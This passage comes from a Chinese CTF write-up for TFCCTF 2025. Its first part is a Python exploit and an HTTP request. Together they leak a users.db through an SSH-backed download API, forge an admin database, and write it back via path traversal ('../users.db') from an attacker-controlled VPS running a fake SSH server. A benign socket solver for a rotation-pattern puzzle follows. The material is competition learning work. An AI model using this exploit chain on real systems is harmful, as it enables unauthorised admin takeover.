class="keyword">raise</span> RuntimeError(<span class="string">f&quot;网络错误: <span class="subst">&#123;e&#125;</span>&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_db_id_from_text</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从 /api/download 返回的文本内容中提取 32 位十六进制 DB_ID。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    由于服务端以 utf-8 读取二进制 SQLite 文件，内容可能被破坏，但 &#x27;db_id&#x27; 与其值通常</span></span><br><span class="line"><span class="string">    仍以明文出现。这里优先匹配 &#x27;db_id&#x27; 附近的 32 位 hex；若失败，回退为全局第一个 32 位 hex。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 优先：锚定 &#x27;db_id&#x27; 关键字附近 0..128 字符内的 32 位十六进制</span></span><br><span class="line">    m = re.search(<span class="string">r&quot;db_id[\s\S]&#123;0,128&#125;?([a-f0-9]&#123;32&#125;)&quot;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 回退：任意出现的 32 位十六进制</span></span><br><span class="line">    m = re.search(<span class="string">r&quot;([a-f0-9]&#123;32&#125;)&quot;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_db_id</span>(<span class="params">base_url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用 /api/download 下载 users.db，并从响应内容中提取 DB_ID。&quot;&quot;&quot;</span></span><br><span class="line">    url = base_url.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/api/download&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,         <span class="comment"># 在容器内连向本机 sshd</span></span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;users.db&quot;</span>,      <span class="comment"># 远端路径将解析为 /app/users.db</span></span><br><span class="line">        <span class="string">&quot;keyPath&quot;</span>: <span class="string">&quot;/root/.ssh/id_rsa&quot;</span>,  <span class="comment"># 容器内预置的私钥</span></span><br><span class="line">        <span class="string">&quot;downloadPath&quot;</span>: <span class="string">&quot;/app/downloads/&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    resp = http_post_json(url, payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(resp, <span class="built_in">dict</span>) <span class="keyword">or</span> <span class="keyword">not</span> resp.get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;下载 users.db 失败: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">    content = resp.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(content, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;下载结果无内容或类型异常&quot;</span>)</span><br><span class="line"></span><br><span class="line">    db_id = extract_db_id_from_text(content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> db_id:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能从返回内容中解析出 DB_ID&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> db_id</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forge_users_db</span>(<span class="params"></span></span><br><span class="line"><span class="params">    output_path: <span class="built_in">str</span>, db_id: <span class="built_in">str</span>, admin_username: <span class="built_in">str</span>, admin_password_hash: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成符合目标服务结构的 users.db 并写入管理员。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 确保输出目录存在</span></span><br><span class="line">    out_dir = os.path.dirname(os.path.abspath(output_path)) <span class="keyword">or</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若已存在，先删除避免旧结构干扰</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(output_path):</span><br><span class="line">        os.remove(output_path)</span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(output_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        <span class="comment"># 建表结构与服务端一致</span></span><br><span class="line">        cur.executescript(</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            PRAGMA journal_mode=WAL;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">              id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">              username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">              password TEXT NOT NULL,</span></span><br><span class="line"><span class="string">              admin BOOLEAN DEFAULT 0</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS meta (</span></span><br><span class="line"><span class="string">              key TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">              value TEXT NOT NULL</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 设置 DB 签名</span></span><br><span class="line">        cur.execute(</span><br><span class="line">            <span class="string">&quot;INSERT INTO meta(key, value) VALUES(?, ?) &quot;</span></span><br><span class="line">            <span class="string">&quot;ON CONFLICT(key) DO UPDATE SET value=excluded.value&quot;</span>,</span><br><span class="line">            (<span class="string">&quot;db_id&quot;</span>, db_id),</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 写入管理员用户</span></span><br><span class="line">        cur.execute(</span><br><span class="line">            <span class="string">&quot;INSERT INTO users(username, password, admin) VALUES(?, ?, ?)&quot;</span>,</span><br><span class="line">            (admin_username, admin_password_hash, <span class="number">1</span>),</span><br><span class="line">        )</span><br><span class="line">        conn.commit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;从目标服务提取 DB_ID，并本地生成包含管理员用户的 users.db&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--base-url&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;目标服务根地址，如 http://localhost:3000&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--username&quot;</span>, default=<span class="string">&quot;admin&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;要写入的管理员用户名&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--password&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;Admin@123&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;管理员明文密码（将计算为 bcrypt 哈希存入 DB）&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--output&quot;</span>, default=<span class="string">&quot;./users.db&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出的 SQLite 文件路径&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--password-hash&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;可选：直接提供已计算好的 bcrypt 哈希，若提供将跳过本地计算&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 目标: <span class="subst">&#123;args.base_url&#125;</span>&quot;</span>)</span><br><span class="line">        db_id = fetch_db_id(args.base_url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 提取到 DB_ID: <span class="subst">&#123;db_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> args.password_hash:</span><br><span class="line">            admin_hash = args.password_hash</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 使用外部提供的 bcrypt 哈希&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 正在生成管理员口令的 bcrypt 哈希（成本因子 10）...&quot;</span>)</span><br><span class="line">            admin_hash = bcrypt_hash(args.password)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] bcrypt 哈希: <span class="subst">&#123;admin_hash&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        forge_users_db(args.output, db_id, args.username, admin_hash)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 已生成本地数据库: <span class="subst">&#123;os.path.abspath(args.output)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 后续可通过 SFTP 覆盖漏洞将该文件写回容器以生效。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后打开靶机注册账户 qqq &#x2F; qqq</p>
<p>获取并生成users.db</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\message.py --base-url https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/ --username qqq --password qqq --output users.db</span><br></pre></td></tr></table></figure>

<p>将生成的users.db放在vps的<code>/app/app</code>目录</p>
<p>在服务器上运行<code>fake_server.py</code>,注意检查22端口是否冲突</p>
<p>靶机登录qqq账户, 发包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/download</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=MTpxcXE%3D</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Not;A=Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;139&quot;, &quot;Chromium&quot;;v=&quot;139&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;vps_ip&quot;</span><span class="punctuation">,</span><span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span><span class="string">&quot;../users.db&quot;</span><span class="punctuation">,</span><span class="attr">&quot;keyPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;/root/.ssh/id_rsa&quot;</span><span class="punctuation">,</span><span class="attr">&quot;downloadPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;/app/downloads/&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>服务器收到请求</p>
<p><img src="../images/2025-TFCCTF/14.png" alt="1"></p>
<p>此时qqq账户已经是admin权限</p>
<p>访问<code>/api/admin</code>即得flag</p>
<h2><span id="to-rotate-or-not-to-rotate">TO ROTATE, OR NOT TO ROTATE</span><a href="#to-rotate-or-not-to-rotate" class="header-anchor"></a></h2><p>基于一个3×3网格上的几何图案匹配问题，考查图案的旋转不变性识别</p>
<p>需要稳健地收集 mapping（确保 canonical 不重复），并在 Phase2 自动答题拿 flag,主要遇到的问题是脚本会遇到阻塞问题导致与靶机交互断开</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line">import socket, ssl, <span class="keyword">select</span>, <span class="keyword">time</span>, itertools, json, sys, traceback</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;to-rotate-49ee3aa7dbf3db7e.challs.tfcctf.com&quot;</span></span><br><span class="line">PORT = 1337</span><br><span class="line">RECV_TIMEOUT = 30.0</span><br><span class="line">TARGET_OKS = 120</span><br><span class="line">SAVE_PATH = <span class="string">&quot;canon2N.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- grid / segments (与 server.py 一致) ----------</span></span><br><span class="line">POINTS = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> range(3) <span class="keyword">for</span> y <span class="keyword">in</span> range(3)]</span><br><span class="line"></span><br><span class="line">def gcd(a, b):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="built_in">return</span> abs(a)</span><br><span class="line"></span><br><span class="line">def valid_segment(a, b):</span><br><span class="line">    <span class="keyword">if</span> a == b: <span class="built_in">return</span> False</span><br><span class="line">    dx, dy = abs(a[0]-b[0]), abs(a[1]-b[1])</span><br><span class="line">    <span class="built_in">return</span> gcd(dx, dy) == 1 and 0 &lt;= a[0] &lt;= 2 and 0 &lt;= a[1] &lt;= 2 and 0 &lt;= b[0] &lt;= 2 and 0 &lt;= b[1] &lt;= 2</span><br><span class="line"></span><br><span class="line">SEGMENTS = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(POINTS)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i+1, len(POINTS)):</span><br><span class="line">        a, b = POINTS[i], POINTS[j]</span><br><span class="line">        <span class="keyword">if</span> valid_segment(a, b):</span><br><span class="line">            A, B = sorted([a, b])</span><br><span class="line">            SEGMENTS.append((A, B))</span><br><span class="line">assert len(SEGMENTS) == 28</span><br><span class="line">SEG_INDEX = &#123;SEGMENTS[i]: i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(SEGMENTS))&#125;</span><br><span class="line"></span><br><span class="line">def rot_point(p, k):</span><br><span class="line">    x, y = p; cx, cy = 1, 1</span><br><span class="line">    x0, y0 = x - cx, y - cy</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(k % 4):</span><br><span class="line">        x0, y0 = -y0, x0</span><br><span class="line">    <span class="built_in">return</span> (x0 + cx, y0 + cy)</span><br><span class="line"></span><br><span class="line">def rot_segment(seg, k):</span><br><span class="line">    a, b = seg</span><br><span class="line">    ra, rb = rot_point(a, k), rot_point(b, k)</span><br><span class="line">    A, B = sorted([ra, rb])</span><br><span class="line">    <span class="built_in">return</span> (A, B)</span><br><span class="line"></span><br><span class="line">def canon_bits(segs):</span><br><span class="line">    vals = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(4):</span><br><span class="line">        bits = 0</span><br><span class="line">        <span class="keyword">for</span> (a, b) <span class="keyword">in</span> segs:</span><br><span class="line">            A, B = sorted([a, b])</span><br><span class="line">            rs = rot_segment((A, B), k)</span><br><span class="line">            bits |= (<span class="number">1</span> &lt;&lt; SEG_INDEX[rs])</span><br><span class="line">        vals.append(bits)</span><br><span class="line">    return min(vals)</span><br><span class="line"></span><br><span class="line"># ---------- deterministic candidate generator ----------</span><br><span class="line">def candidate_patterns(max_k=<span class="number">5</span>):</span><br><span class="line">    # 按 k 从 <span class="number">1</span>..max_k 枚举组合（顺序稳定）</span><br><span class="line">    for k in range(<span class="number">1</span>, max_k+<span class="number">1</span>):</span><br><span class="line">        for comb in itertools.combinations(SEGMENTS, k):</span><br><span class="line">            yield list(comb)</span><br><span class="line"></span><br><span class="line"># ---------- socket line reader ----------</span><br><span class="line">class LineReader:</span><br><span class="line">    def __init__(self, sock):</span><br><span class="line">        self.sock = sock</span><br><span class="line">        self.buf = b&quot;&quot;</span><br><span class="line">    def recv_line(self, timeout=RECV_TIMEOUT):</span><br><span class="line">        end = time.time() + timeout</span><br><span class="line">        while True:</span><br><span class="line">            if b&#x27;\n&#x27; in self.buf:</span><br><span class="line">                line, self.buf = self.buf.split(b&#x27;\n&#x27;, <span class="number">1</span>)</span><br><span class="line">                return line.decode(&#x27;utf-<span class="number">8</span>&#x27;, errors=&#x27;replace&#x27;).rstrip(&#x27;\r&#x27;)</span><br><span class="line">            if time.time() &gt; end:</span><br><span class="line">                raise TimeoutError(&quot;recv_line timeout&quot;)</span><br><span class="line">            r, _, _ = select.select([self.sock], [], [], max(<span class="number">0</span>, end - time.time()))</span><br><span class="line">            <span class="keyword">if</span> not r:</span><br><span class="line">                <span class="built_in">continue</span></span><br><span class="line">            data = self.sock.recv(4096)</span><br><span class="line">            <span class="keyword">if</span> not data:</span><br><span class="line">                <span class="keyword">if</span> self.buf:</span><br><span class="line">                    line = self.buf; self.buf = b<span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="built_in">return</span> line.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>).rstrip(<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">                raise EOFError(<span class="string">&quot;connection closed&quot;</span>)</span><br><span class="line">            self.buf += data</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- persistence ----------</span></span><br><span class="line">def save_mapping(canon2N, path=SAVE_PATH):</span><br><span class="line">    try:</span><br><span class="line">        with open(path, <span class="string">&quot;w&quot;</span>) as f:</span><br><span class="line">            json.dump(&#123;str(k): v <span class="keyword">for</span> k, v <span class="keyword">in</span> canon2N.items()&#125;, f)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] save error:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">def load_mapping(path=SAVE_PATH):</span><br><span class="line">    with open(path, <span class="string">&quot;r&quot;</span>) as f:</span><br><span class="line">        j = json.load(f)</span><br><span class="line">    <span class="built_in">return</span> &#123;int(k): v <span class="keyword">for</span> k, v <span class="keyword">in</span> j.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- network connect ----------</span></span><br><span class="line">def connect():</span><br><span class="line">    raw = socket.create_connection((HOST, PORT))</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    ss = ctx.wrap_socket(raw, server_hostname=HOST)</span><br><span class="line">    ss.settimeout(RECV_TIMEOUT)</span><br><span class="line">    <span class="built_in">return</span> ss</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- main ----------</span></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">        ss = connect()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;连接失败：&quot;</span>, e); <span class="built_in">return</span></span><br><span class="line">    rdr = LineReader(ss)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] connected to&quot;</span>, HOST, PORT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 状态</span></span><br><span class="line">    canon2N = 